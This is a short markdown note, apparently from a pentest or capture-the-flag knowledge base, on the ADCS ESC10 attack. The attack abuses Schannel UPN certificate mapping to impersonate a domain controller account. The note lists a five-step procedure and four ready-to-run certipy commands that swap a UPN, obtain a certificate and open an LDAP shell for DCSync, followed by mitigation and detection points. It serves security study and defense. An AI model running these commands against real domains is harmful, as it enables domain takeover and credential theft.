---
topic: ADCS — ESC10 and Schannel UPN mapping
tags: [windows, active-directory, adcs, esc10, schannel, certipy, dcsync]
---

# ADCS — ESC10 and Schannel UPN mapping

**English** | [🌐 Español](esc10-upn-mapping.md)

## Concept

If `CertificateMappingMethods` includes `0x4`, Schannel allows authentication by the certificate UPN. An attacker controlling an account's UPN can set another account's UPN, request a certificate from an accessible template, restore the UPN and use the certificate as the impersonated account.

## When it applies

- You control an account's `userPrincipalName`.
- An accessible user authentication template exists.
- The DC has `CertificateMappingMethods` with bit `0x4`.

## Procedure

1. Read and save the current UPN.
2. Change the UPN to the target account (for example, `DC01$`).
3. Request a certificate with the `User` template.
4. Restore the UPN and authenticate with the PFX.
5. Use the context for DCSync.

## Commands

```bash
certipy account -user victim update -upn 'DC01$@domain.htb' -target DC01.domain.htb -k
certipy req -target DC01.domain.htb -ca <CA> -template User -u victim@domain.htb -p '<PASS>'
certipy account -user victim update -upn 'victim@domain.htb' -target DC01.domain.htb -k
certipy auth -pfx dc01.pfx -dc-ip <IP> -ldap-shell
```

## Variants

- Change the UPN to another privileged user.
- Combine with ESC9 when `GenericWrite` exists.
- Request a certificate with an explicit SAN.

## Limitations

- The Administrator account may be protected.
- Bit `0x4` must be enabled on the DC.
- The template must allow client authentication.

## Mitigation

- Review `CertificateMappingMethods` and disable UPN mapping.
- Restrict who can write UPNs.
- Apply least privilege to templates.

## Detection

- UPN changes followed by certificate requests.
- Certificates issued to machine accounts.
- DCSync from an unexpected account.

## References

- [0xdf — Mirage](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [Certipy — ESC10](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication)
- [Microsoft — Schannel](https://learn.microsoft.com/en-us/windows-server/security/tls/tls-registry-settings)
